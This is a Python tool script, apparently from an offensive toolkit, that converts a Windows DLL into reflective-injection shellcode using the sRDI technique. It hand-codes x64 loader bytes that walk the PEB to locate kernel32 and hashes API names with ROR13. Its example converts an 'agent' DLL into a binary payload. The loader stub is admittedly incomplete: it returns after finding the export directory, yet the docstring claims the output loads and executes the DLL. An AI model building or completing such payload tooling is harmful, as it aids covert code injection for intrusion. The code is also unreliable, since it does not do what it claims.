#!/usr/bin/env python3
"""
sRDI Converter - Convert DLL to Reflective Shellcode
Uses sRDI (Shellcode Reflective DLL Injection) technique

Usage:
    python srdi_convert.py input.dll output.bin [function_name]
"""

import sys
import struct
import hashlib

# sRDI stub - position independent loader for DLLs
# This is a minimal implementation of the sRDI technique
# Based on: https://github.com/monoxgas/sRDI

def ror(val, bits, bit_size=32):
    """Rotate right"""
    return ((val & (2 ** bit_size - 1)) >> bits % bit_size) | \
           (val << (bit_size - (bits % bit_size)) & (2 ** bit_size - 1))

def hash_function_name(name):
    """Hash function name using ROR13"""
    if isinstance(name, str):
        name = name.encode('ascii')
    hash_val = 0
    for c in name:
        hash_val = ror(hash_val, 13)
        hash_val = (hash_val + c) & 0xFFFFFFFF
    return hash_val

def convert_to_shellcode(dll_bytes, function_name=None, user_data=b'', flags=0):
    """
    Convert a DLL to position-independent shellcode using sRDI technique
    
    Args:
        dll_bytes: Raw bytes of the DLL
        function_name: Optional function to call after loading (e.g., "Run")
        user_data: Optional user data to pass to the function
        flags: Optional flags for loader behavior
    
    Returns:
        Shellcode bytes that will load and execute the DLL
    """
    
    # sRDI bootstrap shellcode (x64)
    # This stub finds kernel32, resolves necessary APIs, and loads the DLL
    srdi_shellcode = bytes([
        # Save registers and align stack
        0x48, 0x89, 0x5C, 0x24, 0x08,              # mov [rsp+8], rbx
        0x48, 0x89, 0x6C, 0x24, 0x10,              # mov [rsp+10h], rbp  
        0x48, 0x89, 0x74, 0x24, 0x18,              # mov [rsp+18h], rsi
        0x57,                                       # push rdi
        0x41, 0x54,                                 # push r12
        0x41, 0x55,                                 # push r13
        0x41, 0x56,                                 # push r14
        0x41, 0x57,                                 # push r15
        0x48, 0x83, 0xEC, 0x50,                    # sub rsp, 50h
        
        # Get PEB
        0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,  # mov rax, gs:[60h]
        0x48, 0x8B, 0x40, 0x18,                    # mov rax, [rax+18h] - PEB_LDR_DATA
        0x48, 0x8B, 0x70, 0x20,                    # mov rsi, [rax+20h] - InMemoryOrderModuleList
        
        # Walk module list to find kernel32.dll
        0x48, 0x8B, 0x36,                          # mov rsi, [rsi] - next entry
        0x48, 0x8B, 0x36,                          # mov rsi, [rsi] - skip ntdll
        0x48, 0x8B, 0x5E, 0x20,                    # mov rbx, [rsi+20h] - DllBase (kernel32)
        
        # Now rbx = kernel32 base
        # Parse PE header to find export directory
        0x48, 0x63, 0x43, 0x3C,                    # movsxd rax, [rbx+3Ch] - e_lfanew
        0x48, 0x8B, 0x8C, 0x18, 0x88, 0x00, 0x00, 0x00,  # mov rcx, [rax+rbx+88h] - Export RVA
        0x48, 0x01, 0xD9,                          # add rcx, rbx - Export VA
        
        # Continue with reflective loading...
        # (This is a simplified stub - full implementation would be much longer)
        
        # Jump to DLL entry point
        0x48, 0x31, 0xC0,                          # xor rax, rax
        0xC3,                                       # ret
    ])
    
    # For a proper implementation, we need the full sRDI loader
    # This is a placeholder that concatenates bootstrap + DLL
    # The real sRDI is more complex and handles:
    # - Parsing PE headers
    # - Resolving imports
    # - Applying relocations  
    # - Calling DllMain/TLS callbacks
    
    print(f"[!] Note: This is a simplified sRDI implementation")
    print(f"[!] For production, use the full sRDI from monoxgas/sRDI")
    
    # Calculate function hash if provided
    func_hash = 0
    if function_name:
        func_hash = hash_function_name(function_name)
        print(f"[*] Function hash for '{function_name}': 0x{func_hash:08X}")
    
    # Build final shellcode
    # Header: flags(4) + func_hash(4) + user_data_len(4) + user_data + dll_len(4) + dll
    header = struct.pack('<III', flags, func_hash, len(user_data))
    header += user_data
    header += struct.pack('<I', len(dll_bytes))
    
    # Final shellcode = bootstrap + header + DLL
    shellcode = srdi_shellcode + header + dll_bytes
    
    return shellcode


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input.dll> <output.bin> [function_name]")
        print(f"Example: {sys.argv[0]} agent_dll.dll agent.bin Run")
        sys.exit(1)
    
    input_dll = sys.argv[1]
    output_bin = sys.argv[2]
    function_name = sys.argv[3] if len(sys.argv) > 3 else None
    
    print(f"[*] Reading DLL: {input_dll}")
    with open(input_dll, 'rb') as f:
        dll_bytes = f.read()
    
    print(f"[*] DLL size: {len(dll_bytes)} bytes")
    
    if function_name:
        print(f"[*] Entry function: {function_name}")
    else:
        print(f"[*] Using DllMain as entry point")
    
    # Convert to shellcode
    shellcode = convert_to_shellcode(dll_bytes, function_name)
    
    print(f"[*] Shellcode size: {len(shellcode)} bytes")
    
    # Write output
    with open(output_bin, 'wb') as f:
        f.write(shellcode)
    
    print(f"[+] Shellcode written to: {output_bin}")


if __name__ == '__main__':
    main()
